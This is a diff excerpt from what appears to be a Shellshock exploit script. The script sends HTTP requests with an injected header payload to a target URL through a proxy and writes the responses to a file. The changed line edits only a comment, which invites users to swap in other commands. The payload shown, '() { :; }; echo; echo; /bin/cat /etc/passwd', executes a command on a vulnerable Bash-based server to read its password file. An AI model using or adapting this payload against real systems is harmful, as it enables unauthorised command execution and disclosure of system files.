@@ -20,7 +20,7 @@ def send_request_with_header(url, header_name, payload, proxy, file):
     file.write(f"Sent header: {header_name}, Status Code: {response.status_code}\n\n{response.text}\n\n")
 
 def main(headers_file, url, proxy):
-    # Define the Shellshock payload
+    # Define the Shellshock payload change this using full binary paths if you want a different payload to run e.g /bin/whoami
     payload = "() { :; }; echo; echo; /bin/cat /etc/passwd"
 
     # Open the file to save responses
